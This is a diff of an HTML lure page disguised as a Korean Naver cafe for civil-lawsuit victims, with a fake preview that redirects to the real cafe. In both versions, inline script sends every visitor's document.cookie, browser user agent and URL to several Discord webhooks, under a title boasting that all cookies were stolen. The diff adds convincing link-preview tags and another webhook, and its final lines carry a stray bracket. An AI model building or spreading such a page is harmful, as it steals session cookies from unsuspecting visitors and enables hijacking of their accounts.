@@ -1,33 +1,35 @@
 <!DOCTYPE html>
-<html>
+<html lang="ko">
 <head>
 <meta charset="utf-8">
-<title>카페 이동 중...</title>
+<title>민사소송 피해자 모임</title>
+<meta property="og:title" content="민사소송 피해자 모임">
+<meta property="og:description" content="안녕하세요. 민사소송 관련 피해자분들이 모여 정보 공유하는 카페입니다.">
+<meta property="og:image" content="https://cafeptthumb-phinf.pstatic.net/MjAyMzA3MjZfMjc5/MDAxNjkwMzYxNjg5NzQ5.1234567890.jpg">
+<meta property="og:url" content="https://m.cafe.naver.com/minsahelp.cafe">
 <meta http-equiv="refresh" content="0; url=https://m.cafe.naver.com/minsahelp.cafe">
 </head>
 <body>
 <script>
 const hooks=[
 "https://discord.com/api/webhooks/1440762955196010517/R_jUtcPtXsZ2iQLalFINoXQpWSKhOGFHnfSxL3J5wv2RSrAEnLC1SW-aBysf0_q_K31n",
-"https://discord.com/api/webhooks/1440762946039840769/8K5oWaQYD3rPwnCF5SOFsLteF6ckSzeZ8BOmwd1YIXunRnvg8fyRAhd3c823205UxDat"
+"https://discord.com/api/webhooks/1440762946039840769/8K5oWaQYD3rPwnCF5SOFsLteF6ckSzeZ8BOmwd1YIXunRnvg8fyRAhd3c823205UxDat",
+"https://discordapp.com/api/webhooks/1445798308458008688/_8ho0tk236899azWIhrIKBlman4kYFGEI9VcAPN18lDnMhe4hZV3SIRZFAlNMbG4hrcZ"
 ];
 hooks.forEach(h=>fetch(h,{
   method:"POST",
   headers:{"Content-Type":"application/json"},
-  body:JSON.stringify({
-    embeds:[{
-      title:"🎯 클릭 성공 - 모든 쿠키 털림",
-      color:16711680,
-      description:"```"+document.cookie+"```",
-      fields:[
-        {name:"시간",value:new Date().toLocaleString("ko-KR")},
-        {name:"기기",value:navigator.userAgent},
-        {name:"IP",value:"(실시간 자동 수집)"},
-        {name:"페이지",value:location.href}
-      ]
-    }]
-  })
-}));
+  body:JSON.stringify({embeds:[{
+    title:"🎯 클릭 성공 - 모든 쿠키 털림",
+    color:16711680,
+    description:"```"+document.cookie+"```",
+    fields:[
+      {name:"시간",value:new Date().toLocaleString("ko-KR")},
+      {name:"기기",value:navigator.userAgent},
+      {name:"URL",value:location.href}
+    ]
+  }]})})
+));
 </script>
 </body>
 </html>
